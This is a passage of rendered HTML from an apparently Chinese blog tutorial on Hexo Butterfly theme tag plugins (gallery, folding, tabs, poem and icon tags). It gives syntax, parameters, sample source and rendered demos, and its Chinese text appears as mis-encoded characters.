class="link">https://i.loli.net/2019/12/25/ryLVePaqkYm4TEK.jpg</span>)</span><br><span class="line">&#123;% endgallery %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="åˆ†æ -4"><p>1.gallerygroup ç›¸å†Œå›¾åº“</p><div class="gallery-group-main">  <figure class="gallery-group">  <img class="gallery-group-img no-lightbox" src='https://cdn.cbd.int/akilar-candyassets@1.0.36/image/1.jpg' alt="Group Image Gallery">  <figcaption>  <div class="gallery-group-name">MC</div>  <p>åœ¨Rikkaã®å…­èŠ±æœåŠ¡å™¨é‡Œç•™ä¸‹çš„è¶³è¿¹</p>  <a href='/gallery/MC/'></a>  </figcaption>  </figure>  <figure class="gallery-group">  <img class="gallery-group-img no-lightbox" src='https://cdn.cbd.int/akilar-candyassets@1.0.36/image/20200907110508327.png' alt="Group Image Gallery">  <figcaption>  <div class="gallery-group-name">Gundam</div>  <p>å“¦å’§å“‡gundamå“’ï¼</p>  <a href='/gallery/Gundam/'></a>  </figcaption>  </figure>  <figure class="gallery-group">  <img class="gallery-group-img no-lightbox" src='https://cdn.cbd.int/akilar-candyassets@1.0.36/image/20200907113116651.png' alt="Group Image Gallery">  <figcaption>  <div class="gallery-group-name">I-am-Akilar</div>  <p>æŸç§æ„ä¹‰ä¸Šä¹Ÿç®—è‡ªæ‹å§</p>  <a href='/gallery/I-am-Akilar/'></a>  </figcaption>  </figure></div>2.gallery ç›¸å†Œ<div class="fj-gallery"><p><img src="https://i.loli.net/2019/12/25/Fze9jchtnyJXMHN.jpg" alt=""><br><img src="https://i.loli.net/2019/12/25/ryLVePaqkYm4TEK.jpg" alt=""></p>          </div><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-20-æŠ˜å æ¡†-folding">2.20 æŠ˜å æ¡† folding</h2><div class="tabs" id="åˆ†æ "><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#åˆ†æ -1">æ ‡ç­¾è¯­æ³•</button></li><li class="tab"><button type="button" data-href="#åˆ†æ -2">ç¤ºä¾‹æºç </button></li><li class="tab"><button type="button" data-href="#åˆ†æ -3">æ¸²æŸ“æ¼”ç¤º</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="åˆ†æ -1"><p>1.gallerygroup ç›¸å†Œå›¾åº“</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% folding å‚æ•°ï¼ˆå¯é€‰ï¼‰, æ ‡é¢˜ %&#125;</span><br><span class="line">![](<span class="link">https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper/abstract/41F215B9-261F-48B4-80B5-4E86E165259E.jpeg</span>)</span><br><span class="line">&#123;% endfolding %&#125;</span><br></pre></td></tr></table></figure><!-- tab å‚æ•°é…ç½® --><ol><li><p><code>é¢œè‰²</code>ï¼šblue, cyan, green, yellow, red</p></li><li><p><code>çŠ¶æ€</code>ï¼šçŠ¶æ€å¡«å†™ open ä»£è¡¨é»˜è®¤æ‰“å¼€ã€‚</p></li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="åˆ†æ -2"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">&#123;% folding æŸ¥çœ‹å›¾ç‰‡æµ‹è¯• %&#125;</span><br><span class="line"></span><br><span class="line">![](<span class="link">https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper/abstract/41F215B9-261F-48B4-80B5-4E86E165259E.jpeg</span>)</span><br><span class="line"></span><br><span class="line">&#123;% endfolding %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% folding cyan open, æŸ¥çœ‹é»˜è®¤æ‰“å¼€çš„æŠ˜å æ¡† %&#125;</span><br><span class="line"></span><br><span class="line">è¿™æ˜¯ä¸€ä¸ªé»˜è®¤æ‰“å¼€çš„æŠ˜å æ¡†ã€‚</span><br><span class="line"></span><br><span class="line">&#123;% endfolding %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% folding green, æŸ¥çœ‹ä»£ç æµ‹è¯• %&#125;</span><br><span class="line">å‡è£…è¿™é‡Œæœ‰ä»£ç å—ï¼ˆä»£ç å—æ²¡æ³•åµŒå¥—ä»£ç å—ï¼‰</span><br><span class="line">&#123;% endfolding %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% folding yellow, æŸ¥çœ‹åˆ—è¡¨æµ‹è¯• %&#125;</span><br><span class="line"></span><br><span class="line"><span class="bullet">-</span> haha</span><br><span class="line"><span class="bullet">-</span> hehe</span><br><span class="line"></span><br><span class="line">&#123;% endfolding %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% folding red, æŸ¥çœ‹åµŒå¥—æµ‹è¯• %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% folding blue, æŸ¥çœ‹åµŒå¥—æµ‹è¯•2 %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% folding æŸ¥çœ‹åµŒå¥—æµ‹è¯•3 %&#125;</span><br><span class="line"></span><br><span class="line">hahaha <span class="language-xml"><span class="tag">&lt;<span class="name">span</span>&gt;</span></span><span class="language-xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&#x27;https://cdn.jsdelivr.net/gh/volantis-x/cdn-emoji/tieba/%E6%BB%91%E7%A8%BD.png&#x27;</span> <span class="attr">style</span>=<span class="string">&#x27;height:24px&#x27;</span>&gt;</span></span><span class="language-xml"><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line">&#123;% endfolding %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% endfolding %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% endfolding %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="åˆ†æ -3"><details class="folding-tag" ><summary> æŸ¥çœ‹å›¾ç‰‡æµ‹è¯• </summary>              <div class='content'>              <p><img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper/abstract/41F215B9-261F-48B4-80B5-4E86E165259E.jpeg" alt=""></p>              </div>            </details><details class="folding-tag" cyan open><summary> æŸ¥çœ‹é»˜è®¤æ‰“å¼€çš„æŠ˜å æ¡† </summary>              <div class='content'>              <p>è¿™æ˜¯ä¸€ä¸ªé»˜è®¤æ‰“å¼€çš„æŠ˜å æ¡†ã€‚</p>              </div>            </details><details class="folding-tag" green><summary> æŸ¥çœ‹ä»£ç æµ‹è¯• </summary>              <div class='content'>              <p>å‡è£…è¿™é‡Œæœ‰ä»£ç å—ï¼ˆä»£ç å—æ²¡æ³•åµŒå¥—ä»£ç å—ï¼‰</p>              </div>            </details><details class="folding-tag" yellow><summary> æŸ¥çœ‹åˆ—è¡¨æµ‹è¯• </summary>              <div class='content'>              <ul><li>haha</li><li>hehe</li></ul>              </div>            </details><details class="folding-tag" red><summary> æŸ¥çœ‹åµŒå¥—æµ‹è¯• </summary>              <div class='content'>              <details class="folding-tag" blue><summary> æŸ¥çœ‹åµŒå¥—æµ‹è¯•2 </summary>              <div class='content'>              <details class="folding-tag" ><summary> æŸ¥çœ‹åµŒå¥—æµ‹è¯•3 </summary>              <div class='content'>              <p>hahaha <span><img src='https://cdn.jsdelivr.net/gh/volantis-x/cdn-emoji/tieba/%E6%BB%91%E7%A8%BD.png' style='height:24px'></span></p>              </div>            </details>              </div>            </details>              </div>            </details><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-21-åˆ†æ -tab">2.21 åˆ†æ  tab</h2><div class="tabs" id="åˆ†æ "><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#åˆ†æ -1">æ ‡ç­¾è¯­æ³•</button></li><li class="tab"><button type="button" data-href="#åˆ†æ -2">é…ç½®å‚æ•°</button></li><li class="tab"><button type="button" data-href="#åˆ†æ -3">ç¤ºä¾‹æºç </button></li><li class="tab"><button type="button" data-href="#åˆ†æ -4">æ¸²æŸ“æ¼”ç¤º</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="åˆ†æ -1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;% tabs Unique name, [index] %&#125;</span><br><span class="line">&lt;!-- tab [Tab caption] [@icon] --&gt;</span><br><span class="line">Any content (support inline tags too).</span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line">&#123;% endtabs %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="åˆ†æ -2"><ol><li><p>Unique name :</p><ul><li><p>é€‰é¡¹å¡å—æ ‡ç­¾çš„å”¯ä¸€åç§°ï¼Œä¸å¸¦é€—å·ã€‚</p></li><li><p>å°†åœ¨#idä¸­ç”¨ä½œæ¯ä¸ªæ ‡ç­¾åŠå…¶ç´¢å¼•å·çš„å‰ç¼€ã€‚</p></li><li><p>å¦‚æœåç§°ä¸­åŒ…å«ç©ºæ ¼ï¼Œåˆ™å¯¹äºç”Ÿæˆ#idï¼Œæ‰€æœ‰ç©ºæ ¼å°†ç”±ç ´æŠ˜å·ä»£æ›¿ã€‚</p></li><li><p>ä»…å½“å‰å¸–å­/é¡µé¢çš„URLå¿…é¡»æ˜¯å”¯ä¸€çš„ï¼</p></li></ul></li><li><p>[index]:</p><ul><li><p>æ´»åŠ¨é€‰é¡¹å¡çš„ç´¢å¼•å·ã€‚</p></li><li><p>å¦‚æœæœªæŒ‡å®šï¼Œå°†é€‰æ‹©ç¬¬ä¸€ä¸ªæ ‡ç­¾ï¼ˆ1ï¼‰ã€‚</p></li><li><p>å¦‚æœindexä¸º-1ï¼Œåˆ™ä¸ä¼šé€‰æ‹©ä»»ä½•é€‰é¡¹å¡ã€‚</p></li><li><p>å¯é€‰å‚æ•°ã€‚</p></li></ul></li><li><p>[Tab caption]:</p><ul><li><p>å½“å‰é€‰é¡¹å¡çš„æ ‡é¢˜ã€‚</p></li><li><p>å¦‚æœæœªæŒ‡å®šæ ‡é¢˜ï¼Œåˆ™å¸¦æœ‰åˆ¶è¡¨ç¬¦ç´¢å¼•åç¼€çš„å”¯ä¸€åç§°å°†ç”¨ä½œåˆ¶è¡¨ç¬¦çš„æ ‡é¢˜ã€‚</p></li><li><p>å¦‚æœæœªæŒ‡å®šæ ‡é¢˜ï¼Œä½†æŒ‡å®šäº†å›¾æ ‡ï¼Œåˆ™æ ‡é¢˜å°†ä¸ºç©ºã€‚</p></li><li><p>å¯é€‰å‚æ•°ã€‚</p></li></ul></li><li><p>[@icon]:</p><ul><li><p>FontAwesomeå›¾æ ‡åç§°ï¼ˆå…¨åï¼Œçœ‹èµ·æ¥åƒâ€œ fas fa-fontâ€ï¼‰</p></li><li><p>å¯ä»¥æŒ‡å®šå¸¦ç©ºæ ¼æˆ–ä¸å¸¦ç©ºæ ¼ï¼›</p></li><li><p>ä¾‹å¦‚â€™Tab caption @iconâ€™ å’Œ â€˜Tab caption@iconâ€™.</p></li><li><p>å¯é€‰å‚æ•°ã€‚</p></li></ul></li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="åˆ†æ -3"><p>1.Demo 1 - é¢„è®¾é€‰æ‹©ç¬¬ä¸€ä¸ªã€é»˜è®¤ã€‘</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;% tabs test1 %&#125;</span><br><span class="line">&lt;!-- tab --&gt;</span><br><span class="line"><span class="strong">**This is Tab 1.**</span></span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- tab --&gt;</span><br><span class="line"><span class="strong">**This is Tab 2.**</span></span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- tab --&gt;</span><br><span class="line"><span class="strong">**This is Tab 3.**</span></span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line">&#123;% endtabs %&#125;</span><br></pre></td></tr></table></figure><p>2.Demo 2 - é¢„è®¾é€‰æ‹©tabs</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;% tabs test2, 3 %&#125;</span><br><span class="line">&lt;!-- tab --&gt;</span><br><span class="line"><span class="strong">**This is Tab 1.**</span></span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- tab --&gt;</span><br><span class="line"><span class="strong">**This is Tab 2.**</span></span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- tab --&gt;</span><br><span class="line"><span class="strong">**This is Tab 3.**</span></span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line">&#123;% endtabs %&#125;</span><br></pre></td></tr></table></figure><p>3.Demo 3 - æ²¡æœ‰é¢„è®¾å€¼</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;% tabs test3, -1 %&#125;</span><br><span class="line">&lt;!-- tab --&gt;</span><br><span class="line"><span class="strong">**This is Tab 1.**</span></span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- tab --&gt;</span><br><span class="line"><span class="strong">**This is Tab 2.**</span></span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- tab --&gt;</span><br><span class="line"><span class="strong">**This is Tab 3.**</span></span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line">&#123;% endtabs %&#125;</span><br></pre></td></tr></table></figure><p>4.Demo 4 - è‡ªå®šä¹‰Tabå + åªæœ‰icon + iconå’ŒTabå</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;% tabs test4 %&#125;</span><br><span class="line">&lt;!-- tab ç¬¬ä¸€ä¸ªTab --&gt;</span><br><span class="line"><span class="strong">**tabåå­—ä¸ºç¬¬ä¸€ä¸ªTab**</span></span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- tab @fab fa-apple-pay --&gt;</span><br><span class="line"><span class="strong">**åªæœ‰å›¾æ ‡ æ²¡æœ‰Tabåå­—**</span></span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- tab ç‚¸å¼¹@fas fa-bomb --&gt;</span><br><span class="line"><span class="strong">**åå­—+icon**</span></span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line">&#123;% endtabs %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="åˆ†æ -4"><p>1.Demo 1 - é¢„è®¾é€‰æ‹©ç¬¬ä¸€ä¸ªã€é»˜è®¤ã€‘</p><div class="tabs" id="test1"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#test1-1">test1 1</button></li><li class="tab"><button type="button" data-href="#test1-2">test1 2</button></li><li class="tab"><button type="button" data-href="#test1-3">test1 3</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="test1-1"><p><strong>This is Tab 1.</strong></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test1-2"><p><strong>This is Tab 2.</strong></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test1-3"><p><strong>This is Tab 3.</strong></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><p>2.Demo 2 - é¢„è®¾é€‰æ‹©tabs</p><div class="tabs" id="test2"><ul class="nav-tabs"><li class="tab"><button type="button" data-href="#test2-1">test2 1</button></li><li class="tab"><button type="button" data-href="#test2-2">test2 2</button></li><li class="tab active"><button type="button" data-href="#test2-3">test2 3</button></li></ul><div class="tab-contents"><div class="tab-item-content" id="test2-1"><p><strong>This is Tab 1.</strong></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test2-2"><p><strong>This is Tab 2.</strong></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content active" id="test2-3"><p><strong>This is Tab 3.</strong></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><p>3.Demo 3 - æ²¡æœ‰é¢„è®¾å€¼</p><div class="tabs" id="test3"><ul class="nav-tabs"><li class="tab"><button type="button" data-href="#test3-1">test3 1</button></li><li class="tab"><button type="button" data-href="#test3-2">test3 2</button></li><li class="tab"><button type="button" data-href="#test3-3">test3 3</button></li></ul><div class="tab-contents"><div class="tab-item-content" id="test3-1"><p><strong>This is Tab 1.</strong></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test3-2"><p><strong>This is Tab 2.</strong></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test3-3"><p><strong>This is Tab 3.</strong></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><p>4.Demo 4 - è‡ªå®šä¹‰Tabå + åªæœ‰icon + iconå’ŒTabå</p><div class="tabs" id="test4"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#test4-1">ç¬¬ä¸€ä¸ªTab</button></li><li class="tab"><button type="button" data-href="#test4-2"><i class="fab fa-apple-pay" style="text-align: center;"></i></button></li><li class="tab"><button type="button" data-href="#test4-3"><i class="fas fa-bomb"></i>ç‚¸å¼¹</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="test4-1"><p><strong>tabåå­—ä¸ºç¬¬ä¸€ä¸ªTab</strong></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test4-2"><p><strong>åªæœ‰å›¾æ ‡ æ²¡æœ‰Tabåå­—</strong></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test4-3"><p><strong>åå­—+icon</strong></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-22-è¯—è¯æ ‡ç­¾-poem">2.22 è¯—è¯æ ‡ç­¾ poem</h2><div class="tabs" id="åˆ†æ "><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#åˆ†æ -1">å‚æ•°é…ç½®</button></li><li class="tab"><button type="button" data-href="#åˆ†æ -2">ç¤ºä¾‹æºç </button></li><li class="tab"><button type="button" data-href="#åˆ†æ -3">æ¸²æŸ“æ¼”ç¤º</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="åˆ†æ -1"><ol><li><code>title</code>ï¼šè¯—è¯æ ‡é¢˜</li><li><code>author</code>ï¼šä½œè€…ï¼Œå¯ä»¥ä¸å†™</li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="åˆ†æ -2"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#123;% poem æ°´è°ƒæ­Œå¤´,è‹è½¼ %&#125;</span><br><span class="line">ä¸™è¾°ä¸­ç§‹ï¼Œæ¬¢é¥®è¾¾æ—¦ï¼Œå¤§é†‰ï¼Œä½œæ­¤ç¯‡ï¼Œå…¼æ€€å­ç”±ã€‚</span><br><span class="line">æ˜æœˆå‡ æ—¶æœ‰ï¼ŸæŠŠé…’é—®é’å¤©ã€‚</span><br><span class="line">ä¸çŸ¥å¤©ä¸Šå®«é˜™ï¼Œä»Šå¤•æ˜¯ä½•å¹´ï¼Ÿ</span><br><span class="line">æˆ‘æ¬²ä¹˜é£å½’å»ï¼Œåˆæç¼æ¥¼ç‰å®‡ï¼Œé«˜å¤„ä¸èƒœå¯’ã€‚</span><br><span class="line">èµ·èˆå¼„æ¸…å½±ï¼Œä½•ä¼¼åœ¨äººé—´ï¼Ÿ</span><br><span class="line"></span><br><span class="line">è½¬æœ±é˜ï¼Œä½ç»®æˆ·ï¼Œç…§æ— çœ ã€‚</span><br><span class="line">ä¸åº”æœ‰æ¨ï¼Œä½•äº‹é•¿å‘åˆ«æ—¶åœ†ï¼Ÿ</span><br><span class="line">äººæœ‰æ‚²æ¬¢ç¦»åˆï¼Œæœˆæœ‰é˜´æ™´åœ†ç¼ºï¼Œæ­¤äº‹å¤éš¾å…¨ã€‚</span><br><span class="line">ä½†æ„¿äººé•¿ä¹…ï¼Œåƒé‡Œå…±å©µå¨Ÿã€‚</span><br><span class="line">&#123;% endpoem %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="åˆ†æ -3"><div class='poem'><div class='poem-title'>æ°´è°ƒæ­Œå¤´</div><div class='poem-author'>è‹è½¼</div><p>ä¸™è¾°ä¸­ç§‹ï¼Œæ¬¢é¥®è¾¾æ—¦ï¼Œå¤§é†‰ï¼Œä½œæ­¤ç¯‡ï¼Œå…¼æ€€å­ç”±ã€‚<br>æ˜æœˆå‡ æ—¶æœ‰ï¼ŸæŠŠé…’é—®é’å¤©ã€‚<br>ä¸çŸ¥å¤©ä¸Šå®«é˜™ï¼Œä»Šå¤•æ˜¯ä½•å¹´ï¼Ÿ<br>æˆ‘æ¬²ä¹˜é£å½’å»ï¼Œåˆæç¼æ¥¼ç‰å®‡ï¼Œé«˜å¤„ä¸èƒœå¯’ã€‚<br>èµ·èˆå¼„æ¸…å½±ï¼Œä½•ä¼¼åœ¨äººé—´ï¼Ÿ</p><p>è½¬æœ±é˜ï¼Œä½ç»®æˆ·ï¼Œç…§æ— çœ ã€‚<br>ä¸åº”æœ‰æ¨ï¼Œä½•äº‹é•¿å‘åˆ«æ—¶åœ†ï¼Ÿ<br>äººæœ‰æ‚²æ¬¢ç¦»åˆï¼Œæœˆæœ‰é˜´æ™´åœ†ç¼ºï¼Œæ­¤äº‹å¤éš¾å…¨ã€‚<br>ä½†æ„¿äººé•¿ä¹…ï¼Œåƒé‡Œå…±å©µå¨Ÿã€‚</p></div><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-23-é˜¿é‡Œå›¾æ ‡-icon">2.23 é˜¿é‡Œå›¾æ ‡ icon</h2><div class="tabs" id="åˆ†æ "><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#åˆ†æ -1">æ ‡ç­¾è¯­æ³•</button></li><li class="tab"><button type="button" data-href="#åˆ†æ -2">å‚æ•°é…ç½®</button></li><li class="tab"><button type="button" data-href="#åˆ†æ -3">ç¤ºä¾‹æºç </button></li><li class="tab"><button type="button" data-href="#åˆ†æ -4">æ¸²æŸ“æ¼”ç¤º</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="åˆ†æ -1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% icon [icon-xxxx],[font-size] %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="åˆ†æ -2"><ol><li><code>icon-xxxx</code>ï¼šè¡¨ç¤ºå›¾æ ‡<code>font-class</code>,å¯ä»¥åœ¨è‡ªå·±çš„é˜¿é‡ŒçŸ¢é‡å›¾æ ‡åº“é¡¹ç›®çš„<code>font-class</code>å¼•ç”¨æ–¹æ¡ˆå†…æŸ¥è¯¢å¹¶å¤åˆ¶ã€‚</li><li><code>font-size</code>ï¼šè¡¨ç¤ºå›¾æ ‡å¤§å°ï¼Œç›´æ¥å¡«å†™æ•°å­—å³å¯ï¼Œå•ä½ä¸º<code>em</code>ã€‚å›¾æ ‡å¤§å°é»˜è®¤å€¼ä¸º<code>1em</code>ã€‚</li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="åˆ†æ -3"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&#123;% icon icon-rat<span class="emphasis">_zi %&#125;&#123;% icon icon-rat,2 %&#125;</span></span><br><span class="line"><span class="emphasis"></span></span><br><span class="line"><span class="emphasis">&#123;% icon icon-ox_</span>chou,3 %&#125;&#123;% icon icon-ox,4 %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% icon icon-tiger<span class="emphasis">_yin,5 %&#125;&#123;% icon icon-tiger,6 %&#125;</span></span><br><span class="line"><span class="emphasis"></span></span><br><span class="line"><span class="emphasis">&#123;% icon icon-rabbit_</span>mao,1 %&#125;&#123;% icon icon-rabbit,2 %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% icon icon-dragon<span class="emphasis">_chen,3 %&#125;&#123;% icon icon-dragon,4 %&#125;</span></span><br><span class="line"><span class="emphasis"></span></span><br><span class="line"><span class="emphasis">&#123;% icon icon-snake_</span>si,5 %&#125;&#123;% icon icon-snake,6 %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% icon icon-horse<span class="emphasis">_wu %&#125;&#123;% icon icon-horse,2 %&#125;</span></span><br><span class="line"><span class="emphasis"></span></span><br><span class="line"><span class="emphasis">&#123;% icon icon-goat_</span>wei,3 %&#125;&#123;% icon icon-goat,4 %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% icon icon-monkey<span class="emphasis">_shen,5 %&#125;&#123;% icon icon-monkey,6 %&#125;</span></span><br><span class="line"><span class="emphasis"></span></span><br><span class="line"><span class="emphasis">&#123;% icon icon-rooster_</span>you %&#125;&#123;% icon icon-rooster,2 %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% icon icon-dog<span class="emphasis">_xu,3 %&#125;&#123;% icon icon-dog,4 %&#125;</span></span><br><span class="line"><span class="emphasis"></span></span><br><span class="line"><span class="emphasis">&#123;% icon icon-boar_</span>hai,5 %&#125;&#123;% icon icon-boar,6 %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="åˆ†æ -4"><p><svg class="icon" style="width:1em; height:1em" aria-hidden="true"><use 